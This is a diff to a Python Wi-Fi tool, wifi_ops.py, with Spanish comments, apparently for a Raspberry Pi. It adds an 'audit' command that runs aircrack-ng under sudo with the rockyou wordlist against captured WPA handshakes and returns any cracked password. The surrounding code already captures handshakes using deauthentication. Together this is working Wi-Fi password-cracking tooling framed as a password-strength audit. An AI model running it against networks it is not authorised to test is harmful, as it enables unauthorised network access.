@@ -145,6 +145,37 @@ def capture_handshake(bssid, channel, iface, capture_seconds=20, deauth_count=5,
         aircrack_output += f"\n--- deauth: {deauth_err or 'ok'} ---\n--- log airodump (ultimas lineas) ---\n{dump_log_content[-500:]}"
     return has_hs, cap_file, aircrack_output
 
+
+WORDLIST_DIR = os.path.expanduser("~/piscanlvgl/data/wordlists")
+WORDLISTS = {
+    "common": os.path.join(WORDLIST_DIR, "common.txt"),   # top 10k, chequeo rapido
+    "full":   os.path.join(WORDLIST_DIR, "rockyou.txt"),  # 14M, auditoria a fondo (lento en Pi 3)
+}
+
+def audit_handshake(cap_file, bssid, wordlist_key="common", timeout_seconds=120):
+    """Corre aircrack-ng con una wordlist contra el .cap para ver si la
+    contrasena de la red es debil (esta en la lista). Devuelve
+    (found, password_or_None, output). Con la lista 'common' (10k) tarda
+    segundos; con 'full' (rockyou 14M) puede tardar ~45min en el Pi 3,
+    por eso el timeout configurable."""
+    bssid = bssid.upper()
+    wordlist = WORDLISTS.get(wordlist_key, WORDLISTS["common"])
+
+    if not os.path.exists(cap_file):
+        return False, None, f"No existe el archivo de captura: {cap_file}"
+    if not os.path.exists(wordlist):
+        return False, None, f"No existe la wordlist: {wordlist}"
+
+    r = _run(['sudo', '/usr/bin/timeout', str(timeout_seconds),
+              '/usr/bin/aircrack-ng', '-w', wordlist, '-b', bssid, cap_file],
+             timeout=timeout_seconds + 5)
+    output = ((r.stdout or '') + (r.stderr or '')) if r else ''
+
+    # aircrack-ng imprime "KEY FOUND! [ password ]" si la encontro
+    m = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', output)
+    if m:
+        return True, m.group(1), output
+    return False, None, output
 def main():
     if len(sys.argv) < 2:
         print(json.dumps({"ok": False, "error": "uso: wifi_ops.py <status|enable|disable> [iface]"}))
@@ -193,6 +224,21 @@ def main():
         else:
             log_attack("handshake", bssid, "fail", details=(hs_output or "sin handshake")[:500])
             print(json.dumps({"ok": True, "handshake": False, "cap_file": cap_file, "detail": (hs_output or "")[:400]}))
+    elif cmd == 'audit':
+        if len(sys.argv) < 4:
+            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py audit <cap_file> <bssid> [common|full] [timeout_seg]"}))
+            sys.exit(1)
+        cap_file = sys.argv[2]
+        bssid = sys.argv[3]
+        wordlist_key = sys.argv[4] if len(sys.argv) > 4 else 'common'
+        timeout_seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 120
+        found, password, audit_output = audit_handshake(cap_file, bssid, wordlist_key, timeout_seconds)
+        if found:
+            log_attack("audit", bssid, "weak", details=f"wordlist={wordlist_key} pass_len={len(password)}")
+            print(json.dumps({"ok": True, "found": True, "password": password, "wordlist": wordlist_key}))
+        else:
+            log_attack("audit", bssid, "strong", details=f"wordlist={wordlist_key} no encontrada")
+            print(json.dumps({"ok": True, "found": False, "wordlist": wordlist_key}))
     else:
         print(json.dumps({"ok": False, "error": f"comando desconocido: {cmd}"}))
         sys.exit(1)
